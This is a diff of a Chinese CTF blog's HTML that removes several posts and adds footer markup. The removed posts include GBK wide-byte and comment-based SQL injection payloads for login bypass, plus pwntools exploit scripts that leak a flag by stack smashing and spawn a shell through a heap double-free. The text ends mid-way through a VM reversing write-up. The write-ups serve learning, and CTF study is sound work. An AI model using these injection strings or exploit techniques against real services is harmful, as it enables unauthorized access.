-<p>&ensp;&ensp;同样在CGCTF的习题中存在以上代码。这题还要和union查询一同才可以起作用，先说一下关于GBK sql注入的吧。在我构造以下下sql语句时，返回页面如下<br></p>
-<blockquote>
-<p>id=2%27or%20id=2#<br><br>your sql:select id,title from news where id = ‘2&#39;or id=2’<br>gbk_sql_injection</p>
-</blockquote>
-<p>&ensp;&ensp;但是当构造了如下sql注入语句时，居然产生了如下所示的报错</p>
-<blockquote>
-<p>id=%df%27or%20id=2# <br>your sql:select id,title from news where id = ‘ß&#39;or id=2’<br><br></p>
-<blockquote>
-<p>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10</p>
-</blockquote>
-</blockquote>
-<p>&ensp;&ensp;这就说明，注入点存在，这时就可以进行下一步操作了（union联合查找//貌似是这样叫…）不过还不是很明白，为什么打印到屏幕上的$id不是吃掉/的汉字呢，难道是网页编码问题  _(:3」∠)_ 下次再探究吧，去学一波union联合查找先。</p>
-<p>&ensp;&ensp;30分钟后:我又回来了，果然是网页编码的问题，我的chrome浏览器网页编码不是GBK。但是换成了360浏览器就可以清楚的看到 \ 被吃了,谜题解开了，继续学习union联合查询。</p>
-
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/二进制手的Web路SQL1/" data-id="cjyn83qf5002hicthdek7865n" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-二进制手的Web路SQL0" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/二进制手的Web路SQL0/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.862Z" itemprop="datePublished">2019-07-29</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/WEB/">WEB</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
     
     
-      <header class="article-header">
+        <div class="friends">
+            <div>FRIENDS</div>
+            
+                
+                    <span>
+                        <a href= //www.baidu.com target="_black">friendA</a>
+                    </span>
+                
+            
+                
+                    <span>
+                        <a href= //www.google.com target="_black">friendB</a>
+                    </span>
+                
+            
+                
+            
+        </div>
+    
+    
+        <div class="about-me">
+            <a href = "/about" >ABOUT ME</a>
+        </div>
+    
+</div>
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/二进制手的Web路SQL0/">二进制手的Web路（sql注入篇</a>
-    </h1>
-  
-
-      </header>
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="想入门一下Web，非常的那种。"><a href="#想入门一下Web，非常的那种。" class="headerlink" title="想入门一下Web，非常的那种。"></a><strong>想入门一下Web，非常的那种。</strong></h2><p><strong>那这几天系统的学一下SQL注入吧</strong></p>
-<p>&ensp;&ensp;那么什么是SQL注入呢。SQL是数据库的一种，一般的SQL查询语句大概就是SELECT * FROM * WHERE * ,类似这种语句一般都会在PHP代码中构造好，预留出一个空，在取得客户端的用户输入的数值，将其填入，这时，如果不进行过滤的防护措施，不法用户所输入的恶意代码也可能被执行，进而达到控制数据库的效果，先举一个例子吧。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+        
+            
+                <a href="mailto:930109649@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/mozhucy" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
 
-<p>&ensp;&ensp;这是CGCTF上的一道题，只要以管理员身份登陆，就可以拿到flag。但是我们并不知道管理员账号admin的密码，这时我们就可以构造sql注入语句绕过对密码的判断。</p>
-<p><em>select user from ctf where (user=’”.$user.”‘) and (pw=’”.$pass.”‘)</em></p>
-<p>这句话便是关键了,构造sql语句为”admin’)#”</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from ctf where (user=<span class="string">'admin'</span>)<span class="comment">#') and (pw='".$pass."')</span></span><br></pre></td></tr></table></figure>
-
-<p>&ensp;&ensp;从而达到我们的目的。（代码效果如上单引号闭合，直接“#”直接注释掉多余内容。<br><br>&ensp;&ensp;大概了解了SQL注入的原理了，下面来细数一下SQL注入的几个类型</p>
-<ul>
-<li>Boolean-based blind SQL injection（布尔型注入）</li>
-<li>Error-based SQL injection（报错型注入）</li>
-<li>UNION query SQL injection（可联合查询注入）</li>
-<li>Stacked queries SQL injection（可多语句查询注入）</li>
-<li>Time-based blind SQL injection（基于时间延迟注入）<br></li>
-</ul>
-<p>接下来的几篇博文，会分别整理出这5种SQL注入的方式，欢迎关注。</p>
-
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/二进制手的Web路SQL0/" data-id="cjyn83qf4002ficthalwxjtms" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-z3" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/z3/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.855Z" itemprop="datePublished">2019-07-29</time>
-</a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/RE/">RE</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/z3/">z3求解器的一些简单使用</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="pip-install-z3-solver"><a href="#pip-install-z3-solver" class="headerlink" title="pip install z3-solver"></a>pip install z3-solver</h1><ul>
-<li>安装这东西,一行就够了,记住不要直接pip install z3就好</li>
-<li>from z3 import *</li>
-<li>然后创建一个通用求解器,s = Solver()</li>
-<li>一些函数:s.add()添加条件,s.model()列出求解结果,s.check()查看约束条件是否合格</li>
-<li>一般循环设立值是这样的:X=[Int(“x%d”%i) for i in range(5)]</li>
-<li>add的条件可以用逗号隔开,然后从s.model()中提取数据s.model()[x].as_long()</li>
-<li>之后有用到的例题在下面总结下</li>
-</ul>
-
-      
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/z3/" data-id="cjyn83qf2002bicthg9vvqyre" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-xnuca-final" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/xnuca-final/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.851Z" itemprop="datePublished">2019-07-29</time>
-</a>
+    <!-- 不蒜子  -->
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/PWN/">PWN</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
+    <div class="busuanzi-container">
     
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
     
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/xnuca-final/">X-NUCA 2018个人赛/决赛PWN</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>终于熬过考试周了…重装电脑加上配虚拟机博客环境前后花了快两天.寒假整理一下以前的题目吧,先是12月初的XNUCA总决赛和铁三总决赛.</p>
-<h1 id="个人赛"><a href="#个人赛" class="headerlink" title="个人赛"></a>个人赛</h1><h2 id="PWN0-18solve"><a href="#PWN0-18solve" class="headerlink" title="PWN0(18solve)"></a>PWN0(18solve)</h2><ul>
-<li>个人赛签到题,一个gets栈溢出,有canary,只有一次输入机会,显然不是ROP的打法,flag在内存中,先让我们输入小于flag长度的任意字符,输入回车结束</li>
-<li>这里利用stack smash,当canary存在时,如果发生栈溢出,程序会执行如下代码:</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>因为flag在内存中,所以我们可以算出输入点和__libc_argv[0],也就是程序名称的偏移,填充后写入一根指针,利用报错信息打印flag,由于内存映射机制,所以程序中有时候会存在两个flag</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./catch_me"</span>)</span><br><span class="line"><span class="comment"># for i in range(24):</span></span><br><span class="line">r = remote(<span class="string">"172.19.8.82"</span>,<span class="number">9999</span>)</span><br><span class="line">r.recvuntil(<span class="string">"flag:"</span>)</span><br><span class="line">r.sendline(<span class="string">""</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x7fffffffdf38</span> - <span class="number">0x7fffffffde10</span>) + p64(<span class="number">0x600CA0</span>)</span><br><span class="line">r.recvuntil(<span class="string">"sure?"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">flag = r.recv(<span class="number">32</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>当时因为是给了一台内网的机器,没有pwntools,最后用的socket写的脚本,后来才知道有一个单文件库zio可以直接复制进去用.</li>
-<li>然后并没有给pwn题的服务器和端口,最后只能用nmap扫描端口逐一nc来确定题目XD</li>
-</ul>
-<h2 id="PWN1-10solve"><a href="#PWN1-10solve" class="headerlink" title="PWN1(10solve)"></a>PWN1(10solve)</h2><ul>
-<li>这就是一个堆题了,记得当时有几个师傅做的也非常快</li>
-<li>扫一遍功能switch,发现有两个后门!输入1234和输入2333的时候会分别出发,1234就是一个malloc(0x20)然后向里面和bss段分别读入0x20,2333则是system(command),很明显这是要修改command为/bin/sh</li>
-<li>分别查看几个基础功能函数,发现在new时,存在一个<code>scanf(&quot;%32s&quot;,ptr)</code>,也就是这里存在了一个off-by-null,scanf函数自动补的0使得当输入恰好为32位的时候,会有33位被赋值.</li>
-<li>后面的功能函数则是才用了read函数,不存在溢出,在free处,也有对应的inuse数组作为防止double-free的保护,整理结构体发现</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> content[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> * nameptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>也就是content刚好可以盖到nameptr指针,使得低位变成0,加上后门1234的偏移刚好可以获得指向相同堆块的指针,一发double解决,还要注意的是fastbin的验证条件.</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./note"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    r.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,content)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">    sa(<span class="string">"name:"</span>,name)</span><br><span class="line">    sa(<span class="string">"content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,name,content)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">    sa(<span class="string">"edit\n"</span>,str(index))</span><br><span class="line">    sa(<span class="string">"name:\n"</span>,name)</span><br><span class="line">    sa(<span class="string">"content:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">    sa(<span class="string">"view"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"4"</span>)</span><br><span class="line">    sa(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor1</span><span class="params">(name,content)</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"1234"</span>)</span><br><span class="line">    sa(<span class="string">"name:"</span>,name)</span><br><span class="line">    sa(<span class="string">"content:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getshell</span><span class="params">()</span>:</span></span><br><span class="line">    sa(<span class="string">"command:\n"</span>,<span class="string">"2333"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    backdoor1(<span class="string">"backdoor"</span>,<span class="string">"flagflag"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"0"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"1"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"2"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"3"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"4"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"5"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"6"</span>)</span><br><span class="line">    add(<span class="string">"name"</span>,<span class="string">"7"</span>*<span class="number">0x20</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    </span><br><span class="line">    add(p64(<span class="number">0x602090</span><span class="number">-0x8</span>),<span class="string">"fff"</span>)</span><br><span class="line">    add(<span class="string">"lll"</span>,<span class="string">"lll"</span>)</span><br><span class="line">    add(<span class="string">"aaa"</span>,<span class="string">"a"</span>)</span><br><span class="line">    add(<span class="string">"/bin/sh\x00"</span>,<span class="string">"ggg"</span>)</span><br><span class="line">    getshell()</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="comment">#add("name","/bin/sh\x00")</span></span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sa(<span class="string">"Please leave your name :"</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
-
-<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2>
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/07/29/xnuca-final/" data-id="cjyn83qf10029icth7z54y445" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-xnuca" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/07/29/xnuca/" class="article-date">
-  <time datetime="2019-07-28T17:11:01.846Z" itemprop="datePublished">2019-07-29</time>
-</a>
     
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/RE/">RE</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/29/xnuca/">X-NUCA逆向部分题解</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Code-Interpreter"><a href="#Code-Interpreter" class="headerlink" title="Code_Interpreter"></a>Code_Interpreter</h1><ul>
-<li>一个vm逆向,输入三个int型数据,进入一个vm进行运算,字节码在外面的code文件里,这里整理指令集,打log</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">code = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"090404090000080100080201080302060104050115070001040003016bcc7e1d080103040001020a0400090000080100080201080302060308050303070003030002017c797960080103040001020a040009000008010008020108030206010807000103000201bdbdbc5f080103040001020a040000"</span>.decode(<span class="string">"hex"</span>)]</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">ipi = <span class="number">2</span></span><br><span class="line">what = <span class="number">0</span></span><br><span class="line">ipt = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">stack = [<span class="number">0</span>] * <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    <span class="keyword">if</span> code[i] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"ret"</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">1</span>:</span><br><span class="line">        ipi += <span class="number">1</span></span><br><span class="line">        ipt[ipi] = code[i + <span class="number">1</span>] | code[i + <span class="number">2</span>] &lt;&lt; <span class="number">8</span> | code[i + <span class="number">3</span>] &lt;&lt; <span class="number">16</span> | code[i + <span class="number">4</span>] &lt;&lt;<span class="number">24</span></span><br><span class="line">        i += <span class="number">5</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"input[%d] = 0x%x"</span> % (ipi,ipt[ipi])</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">2</span>:</span><br><span class="line">        ipi -= <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"ipi -= 1"</span></span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">3</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        stack[t1] += stack[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] += stack[%d]"</span>%(t1,t2)</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">4</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        stack[t1] -= stack[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] -= stack[%d]"</span>%(t1,t2)</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">5</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        stack[t1] *= code[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] *= %d"</span>%(t1,t2)</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">6</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        stack[t1] &gt;&gt;= stack[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] &gt;&gt;= %d"</span>%(t1,t2)</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">7</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        stack[t1] = stack[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] = stack[%d]"</span>%(t1,t2)</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">8</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] = input[%d]"</span>%(t1,t2)</span><br><span class="line">        stack[t1] = ipt[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">9</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        stack[t1] ^= stack[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] ^= stack[%d]"</span>%(t1,t2)</span><br><span class="line">    <span class="keyword">elif</span> code[i] == <span class="number">10</span>:</span><br><span class="line">        t1 = code[i + <span class="number">1</span>]</span><br><span class="line">        t2 = code[i + <span class="number">2</span>]</span><br><span class="line">        stack[t1] |= stack[t2]</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"stack[%d] |= stack[%d]"</span>%(t1,t2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"error"</span></span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在找到规律后,发现stack的第0位是reg,stack第5位是isture的判断位,这里修改下指令,得到如下结果</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">isture ^= isture</span><br><span class="line">reg ^= reg</span><br><span class="line">stack[1] = input[0]</span><br><span class="line">stack[2] = input[1]</span><br><span class="line">stack[3] = input[2]</span><br><span class="line">stack[1] &gt;&gt;= 4</span><br><span class="line">stack[1] *= 21</span><br><span class="line">reg = stack[1]</span><br><span class="line">reg -= stack[3]</span><br><span class="line">input[3] = 0x1d7ecc6b</span><br><span class="line">stack[1] = input[3]</span><br><span class="line">reg -= stack[1]</span><br><span class="line">ipi -= 1</span><br><span class="line">isture |= reg</span><br><span class="line"></span><br><span class="line">reg ^= reg</span><br><span class="line">stack[1] = input[0]</span><br><span class="line">stack[2] = input[1]</span><br><span class="line">stack[3] = input[2]</span><br><span class="line">stack[3] &gt;&gt;= 8</span><br><span class="line">stack[3] *= 3</span><br><span class="line">reg = stack[3]</span><br><span class="line">reg += stack[2]</span><br><span class="line">input[3] = 0x6079797c</span><br><span class="line">stack[1] = input[3]</span><br><span class="line">reg -= stack[1]</span><br><span class="line">ipi -= 1</span><br><span class="line">isture |= reg</span><br><span class="line"></span><br><span class="line">reg ^= reg</span><br><span class="line">stack[1] = input[0]</span><br><span class="line">stack[2] = input[1]</span><br><span class="line">stack[3] = input[2]</span><br><span class="line">stack[1] &gt;&gt;= 8</span><br><span class="line">reg = stack[1]</span><br><span class="line">reg += stack[2]</span><br><span class="line">input[3] = 